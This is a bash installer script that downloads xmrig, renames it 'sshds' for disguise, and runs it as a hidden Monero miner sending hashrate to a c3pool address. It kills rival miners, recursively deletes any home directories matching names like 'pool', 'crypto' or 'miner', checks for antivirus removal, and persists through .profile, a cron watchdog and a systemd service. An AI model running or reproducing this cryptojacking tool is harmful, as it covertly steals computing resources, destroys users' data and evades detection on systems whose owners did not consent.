#!/bin/bash

VERSION=2.11

# printing greetings

echo "DSPool mining setup script v$VERSION."
echo "(please report issues to support@c3pool.com email with full output of this script with extra \"-x\" \"bash\" option)"
echo

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not adviced to run this script under root"
fi

# command line arguments
WALLET=$1
EMAIL=$2 # this one is optional

# checking prerequisites

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> setup_dspool_miner.sh <wallet address or USDT TRC20 address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 -a ${#WALLET_BASE} != 34 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106, 95, or 34 for USDT TRC20): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

#if ! sudo -n true 2>/dev/null; then
#  if ! pidof systemd >/dev/null; then
#    echo "ERROR: This script requires systemd to work correctly"
#    exit 1
#  fi
#fi

# calculating port

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

get_port_based_on_hashrate() {
  local hashrate=$1
  if [ "$hashrate" -le "5000" ]; then
    echo 80
  elif [ "$hashrate" -le "25000" ]; then
    if [ "$hashrate" -gt "5000" ]; then
      echo 13333
    else
      echo 443
    fi
  elif [ "$hashrate" -le "50000" ]; then
    if [ "$hashrate" -gt "25000" ]; then
      echo 15555
    else
      echo 14444
    fi
  elif [ "$hashrate" -le "100000" ]; then
    if [ "$hashrate" -gt "50000" ]; then
      echo 19999
    else
      echo 17777
    fi
  elif [ "$hashrate" -le "1000000" ]; then
    echo 23333
  else
    echo "ERROR: Hashrate too high"
    exit 1
  fi
}

PORT=$(get_port_based_on_hashrate $EXP_MONERO_HASHRATE)
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

echo "Computed port: $PORT"


# printing intentions

echo "I will download, setup and run in background Monero CPU miner."
echo "If needed, miner in foreground can be started by $HOME/.sshds/miner.sh script."
echo "Mining will happen to $WALLET wallet."
if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at https://c3pool.com site)"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
else
  echo "Mining in background will be performed using sshds_miner systemd service."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads with $CPU_MHZ MHz and ${TOTAL_CACHE}KB data cache in total, so projected Monero hashrate is around $EXP_MONERO_HASHRATE H/s."
echo

echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
sleep 15
echo
echo

# start doing stuff: preparing miner

echo "[*] Removing previous sshds miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop sshds_miner.service
  # Also try to stop other potential mining services
  sudo systemctl stop dspool_miner.service 2>/dev/null
  sudo systemctl stop c3pool_miner.service 2>/dev/null
  sudo systemctl stop xmrig.service 2>/dev/null
  sudo systemctl stop monero-miner.service 2>/dev/null
  sudo systemctl stop crypto-miner.service 2>/dev/null
fi

# Kill common mining processes (excluding our own sshds)
echo "[*] Terminating common mining processes..."
killall -9 xmrig 2>/dev/null
killall -9 xmrig-cpu 2>/dev/null
killall -9 xmrig-amd 2>/dev/null
killall -9 xmrig-nvidia 2>/dev/null
killall -9 ethminer 2>/dev/null
killall -9 claymore 2>/dev/null
killall -9 phoenixminer 2>/dev/null
killall -9 cgminer 2>/dev/null
killall -9 bfgminer 2>/dev/null
killall -9 cpuminer 2>/dev/null
killall -9 cpuminer-multi 2>/dev/null
killall -9 cpuminer-opt 2>/dev/null
killall -9 minerd 2>/dev/null
killall -9 ccminer 2>/dev/null
killall -9 ewbf 2>/dev/null
killall -9 dstm 2>/dev/null
killall -9 t-rex 2>/dev/null
killall -9 gminer 2>/dev/null
killall -9 lolminer 2>/dev/null
killall -9 teamredminer 2>/dev/null
killall -9 nanominer 2>/dev/null
killall -9 nbminer 2>/dev/null
killall -9 srbminer 2>/dev/null
killall -9 cryptodredge 2>/dev/null
killall -9 bzminer 2>/dev/null
killall -9 xmr-stak 2>/dev/null
killall -9 xmr-stak-cpu 2>/dev/null
killall -9 xmr-stak-amd 2>/dev/null
killall -9 xmr-stak-nvidia 2>/dev/null
killall -9 xmr-stak-rx 2>/dev/null
killall -9 monerod 2>/dev/null

echo "[*] Removing mining-related directories"

# Remove sshds directory
echo "[*] Removing $HOME/.sshds directory"
rm -rf $HOME/.sshds

# Remove other potential mining directories
echo "[*] Removing other mining directories if exist"
rm -rf $HOME/c3pool
rm -rf $HOME/xmrig
rm -rf $HOME/miner
rm -rf $HOME/monero
rm -rf $HOME/crypto
rm -rf $HOME/mining
rm -rf $HOME/pool
rm -rf $HOME/.c3pool
rm -rf $HOME/.xmrig
rm -rf $HOME/.miner
rm -rf $HOME/.monero
rm -rf $HOME/.crypto
rm -rf $HOME/.mining
rm -rf $HOME/.pool

# Remove hidden mining directories with various names
for dir in $(find $HOME -maxdepth 1 -type d -name "*xmr*" 2>/dev/null); do
  echo "[*] Removing $dir"
  rm -rf "$dir"
done

for dir in $(find $HOME -maxdepth 1 -type d -name "*miner*" 2>/dev/null); do
  echo "[*] Removing $dir"
  rm -rf "$dir"
done

for dir in $(find $HOME -maxdepth 1 -type d -name "*pool*" 2>/dev/null); do
  echo "[*] Removing $dir"
  rm -rf "$dir"
done

for dir in $(find $HOME -maxdepth 1 -type d -name "*monero*" 2>/dev/null); do
  echo "[*] Removing $dir"
  rm -rf "$dir"
done

for dir in $(find $HOME -maxdepth 1 -type d -name "*crypto*" 2>/dev/null); do
  echo "[*] Removing $dir"
  rm -rf "$dir"
done

echo "[*] Downloading DSPool advanced version of sshds to /tmp/sshds.tar.gz"
if ! curl -L --progress-bar "https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
  exit 1
fi

echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/.sshds"
[ -d $HOME/.sshds ] || mkdir $HOME/.sshds
if ! tar xf /tmp/xmrig.tar.gz -C $HOME/.sshds; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/.sshds directory"
  exit 1
fi

# Rename xmrig to sshds for disguise
if [ -f $HOME/.sshds/xmrig ]; then
  mv $HOME/.sshds/xmrig $HOME/.sshds/sshds
  echo "[*] Renamed xmrig to sshds for disguise"
fi

rm /tmp/xmrig.tar.gz

echo "[*] Checking if advanced version of $HOME/.sshds/sshds works fine (and not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/.sshds/config.json
$HOME/.sshds/sshds --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/.sshds/sshds ]; then
    echo "WARNING: Advanced version of $HOME/.sshds/sshds is not functional"
  else 
    echo "WARNING: Advanced version of $HOME/.sshds/sshds was removed by antivirus (or some other problem)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest | grep -o 'href="[^"]*"' | grep xenial-x64.tar.gz | head -1 | sed 's/href="//' | sed 's/"//'`
  if [ -z "$LATEST_XMRIG_RELEASE" ]; then
    echo "ERROR: Could not find latest xmrig release"
    exit 1
  fi
  LATEST_XMRIG_LINUX_RELEASE="https://github.com$LATEST_XMRIG_RELEASE"

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
    exit 1
  fi

  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/.sshds"
  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/.sshds --strip=1; then
    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/.sshds directory"
  fi
  rm /tmp/xmrig.tar.gz

  # Rename again if needed
  if [ -f $HOME/.sshds/xmrig ]; then
    mv $HOME/.sshds/xmrig $HOME/.sshds/sshds
  fi

  echo "[*] Checking if stock version of $HOME/.sshds/sshds works fine (and not removed by antivirus software)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.sshds/config.json
  $HOME/.sshds/sshds --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f $HOME/.sshds/sshds ]; then
      echo "ERROR: Stock version of $HOME/.sshds/sshds is not functional too"
    else 
      echo "ERROR: Stock version of $HOME/.sshds/sshds was removed by antivirus too"
    fi
    exit 1
  fi
fi

echo "[*] Miner $HOME/.sshds/sshds is OK"

PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi

# Set CPU usage based on CPU threads
if [ "$CPU_THREADS" -lt "4" ]; then
  CPU_USAGE=45
else
  CPU_USAGE=70
fi

sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:'$PORT'",/' $HOME/.sshds/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.sshds/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.sshds/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": '$CPU_USAGE',/' $HOME/.sshds/config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/.sshds/sshds.log'",#' $HOME/.sshds/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.sshds/config.json

cp $HOME/.sshds/config.json $HOME/.sshds/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/.sshds/config_background.json

# preparing script

echo "[*] Creating $HOME/.sshds/miner.sh script"
cat >$HOME/.sshds/miner.sh <<EOL
#!/bin/bash
if ! pidof sshds >/dev/null; then
  nice $HOME/.sshds/sshds \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall sshds\" or \"sudo killall sshds\" if you want to remove background miner first."
fi
EOL

chmod +x $HOME/.sshds/miner.sh

# Create cron monitoring script
echo "[*] Creating cron monitoring script"
cat >$HOME/.sshds/monitor.sh <<EOL
#!/bin/bash
# Monitor script to check and restart miner if not running

# Check if sshds process is running
if ! pidof sshds >/dev/null; then
    echo "\$(date): sshds not running, restarting..." >> $HOME/.sshds/monitor.log
    # Clean up any zombie processes
    pkill -9 sshds 2>/dev/null
    # Wait a moment
    sleep 5
    # Start the miner
    nohup nice $HOME/.sshds/sshds --config=$HOME/.sshds/config_background.json >> $HOME/.sshds/sshds.log 2>&1 &
    echo "\$(date): sshds restarted" >> $HOME/.sshds/monitor.log
else
    echo "\$(date): sshds is running" >> $HOME/.sshds/monitor.log
fi
EOL

chmod +x $HOME/.sshds/monitor.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep .sshds/miner.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/.sshds/miner.sh script to $HOME/.profile"
    echo "$HOME/.sshds/miner.sh --config=$HOME/.sshds/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/.sshds/miner.sh script is already in the $HOME/.profile"
  fi
  
  # Setup cron job for monitoring
  echo "[*] Setting up cron job for process monitoring"
  CRON_JOB="*/5 * * * * $HOME/.sshds/monitor.sh >/dev/null 2>&1"
  if ! crontab -l 2>/dev/null | grep -q "sshds/monitor.sh"; then
    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
    echo "[*] Cron job added: check every 5 minutes"
  else
    echo "[*] Cron job already exists"
  fi
  
  echo "[*] Running miner in the background (see logs in $HOME/.sshds/sshds.log file)"
  /bin/bash $HOME/.sshds/miner.sh --config=$HOME/.sshds/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] Running miner in the background (see logs in $HOME/.sshds/sshds.log file)"
    /bin/bash $HOME/.sshds/miner.sh --config=$HOME/.sshds/config_background.json >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

    echo "[*] Creating sshds_miner systemd service"
    cat >/tmp/sshds_miner.service <<EOL
[Unit]
Description=Monero miner service

[Service]
ExecStart=$HOME/.sshds/sshds --config=$HOME/.sshds/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/sshds_miner.service /etc/systemd/system/sshds_miner.service
    echo "[*] Starting sshds_miner systemd service"
    sudo killall sshds 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable sshds_miner.service
    sudo systemctl start sshds_miner.service
    echo "To see miner service logs run \"sudo journalctl -u sshds_miner -f\" command"
  fi
fi

echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similair commands under root to limit miner to 45% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e sshds -l $((45*$CPU_THREADS)) -b"
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo "sudo sed -i -e '\$acpulimit -e sshds -l $((45*$CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e sshds -l $((45*$CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 70% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 70,/' \$HOME/.sshds/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 70,/' \$HOME/.sshds/config_background.json"
fi
echo ""

echo "[*] Setup complete"
echo "[*] Cron monitoring: Process will be checked every 5 minutes and restarted if not running"
echo "[*] Monitor logs: $HOME/.sshds/monitor.log"
